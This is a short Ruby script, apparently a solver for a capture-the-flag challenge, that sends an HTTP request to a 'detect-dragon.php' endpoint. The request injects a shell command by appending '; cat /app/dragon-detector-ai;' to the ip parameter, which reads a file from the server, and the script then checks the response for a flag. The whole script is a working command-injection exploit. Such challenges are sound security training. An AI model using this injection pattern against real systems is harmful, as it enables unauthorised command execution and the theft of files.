require 'httparty'
require_relative 'libronsolve'

result = HTTParty.get("#{ get_url() }/detect-dragon.php?ip=1.2.3.4; cat /app/dragon-detector-ai;")

if result.success?
  check_flag(result.parsed_response, terminate: true, partial: true)
else
  puts "Something went wrong: #{ result.parsed_response }"
  exit(1)
end
